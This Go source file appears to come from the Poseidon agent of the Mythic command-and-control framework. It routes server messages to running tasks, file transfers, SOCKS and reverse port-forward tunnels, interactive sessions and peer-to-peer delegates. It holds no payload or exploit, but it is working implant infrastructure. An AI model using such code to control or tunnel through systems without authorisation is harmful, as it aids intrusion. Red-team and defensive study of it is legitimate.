package tasks

import (
	"encoding/base64"
	"encoding/json"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/enums/InteractiveTask"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/files"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/p2p"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"sort"
	"sync"
	"time"
)

var runningTasks = make(map[string]structs.Task)
var runningTaskMutex sync.RWMutex
var removeRunningTasksChannel = make(chan string, 10)

// listenForInboundMythicMessageFromEgressP2PChannel once a P2P profile in pkg/profiles gets a message from Mythic, this handles it
func listenForInboundMythicMessageFromEgressP2PChannel() {
	for {
		message := <-responses.HandleInboundMythicMessageFromEgressChannel
		HandleMessageFromMythic(message)
	}
}

// HandleMessageFromMythic processes a message from Mythic
func HandleMessageFromMythic(mythicMessage structs.MythicMessageResponse) {
	// Handle the response from mythic
	//fmt.Printf("HandleMessageFromMythic:\n%v\n", mythicMessage)
	// loop through each response and check to see if the file_id or task_id matches any existing background tasks
	for i := 0; i < len(mythicMessage.Responses); i++ {
		var r map[string]interface{}
		err := json.Unmarshal(mythicMessage.Responses[i], &r)
		if err != nil {
			//log.Printf("Error unmarshal response to task response: %s", err.Error())
			break
		}
		if taskid, ok := r["task_id"]; ok {
			if task, exists := runningTasks[taskid.(string)]; exists {
				// send data to the channel
				if exists {
					raw, _ := json.Marshal(r)
					if trackingUUID, ok := r["tracking_uuid"]; ok {
						if fileTransfer, exists := task.Job.FileTransfers[trackingUUID.(string)]; exists {
							go func() {
								fileTransfer <- raw
							}()
							continue
						}
					}
					go func() {
						task.Job.ReceiveResponses <- raw
					}()
					continue
				}
			}
		}
	}
	// loop through each socks message and send it off
	for j := 0; j < len(mythicMessage.Socks); j++ {
		//fmt.Printf("got socks message from Mythic %v\n", mythicMessage.Socks[j])
		select {
		case responses.FromMythicSocksChannel <- mythicMessage.Socks[j]:
		case <-time.After(1 * time.Second):
			utils.PrintDebug("dropping socks message because channel is full")
		}

	}
	// loop through each rpwfd message and send it off
	for j := 0; j < len(mythicMessage.Rpfwds); j++ {
		select {
		case responses.FromMythicRpfwdChannel <- mythicMessage.Rpfwds[j]:
		case <-time.After(1 * time.Second):
			utils.PrintDebug("dropping rpfwd message because channel is full")
		}

	}
	// loop through interactive tasks
	for j := 0; j < len(mythicMessage.InteractiveTasks); j++ {
		if task, exists := runningTasks[mythicMessage.InteractiveTasks[j].TaskUUID]; exists {
			//fmt.Printf("interactive task exists, sending data along\n")
			select {
			case task.Job.InteractiveTaskInputChannel <- mythicMessage.InteractiveTasks[j]:
			case <-time.After(1 * time.Second):
				utils.PrintDebug("dropping interactive task message because channel is full")
			}
		} else {
			select {
			case responses.NewInteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
				TaskUUID:    mythicMessage.InteractiveTasks[j].TaskUUID,
				Data:        base64.StdEncoding.EncodeToString([]byte("Task no longer running\n")),
				MessageType: InteractiveTask.Error,
			}:
			case <-time.After(1 * time.Second):
				utils.PrintDebug("dropping interactive task output message because channel is full")
			}

		}
	}
	// sort the Tasks
	sort.Slice(mythicMessage.Tasks, func(i, j int) bool {
		return mythicMessage.Tasks[i].Timestamp < mythicMessage.Tasks[j].Timestamp
	})
	// for each task, give it the appropriate Job information and send it on its way for processing
	for j := 0; j < len(mythicMessage.Tasks); j++ {
		job := &structs.Job{
			Stop:                            new(int),
			ReceiveResponses:                make(chan json.RawMessage, 10),
			SendResponses:                   responses.NewResponseChannel,
			SendFileToMythic:                files.SendToMythicChannel,
			FileTransfers:                   make(map[string]chan json.RawMessage),
			GetFileFromMythic:               files.GetFromMythicChannel,
			SaveFileFunc:                    files.SaveToMemory,
			RemoveSavedFile:                 files.RemoveFromMemory,
			GetSavedFile:                    files.GetFromMemory,
			AddInternalConnectionChannel:    p2p.AddInternalConnectionChannel,
			RemoveInternalConnectionChannel: p2p.RemoveInternalConnectionChannel,
			InteractiveTaskOutputChannel:    responses.NewInteractiveTaskOutputChannel,
			InteractiveTaskInputChannel:     make(chan structs.InteractiveTaskMessage, 50),
			NewAlertChannel:                 responses.NewAlertChannel,
		}
		mythicMessage.Tasks[j].SetRemoveRunningTaskChannel(removeRunningTasksChannel)
		mythicMessage.Tasks[j].Job = job
		runningTaskMutex.Lock()
		runningTasks[mythicMessage.Tasks[j].TaskID] = mythicMessage.Tasks[j]
		runningTaskMutex.Unlock()
		newTaskChannel <- mythicMessage.Tasks[j]
	}
	// loop through each delegate and try to forward it along
	if len(mythicMessage.Delegates) > 0 {
		go p2p.HandleDelegateMessageForInternalP2PConnections(mythicMessage.Delegates)
	}
	//fmt.Printf("returning from HandleMessageFromMythic\n")
	return
}
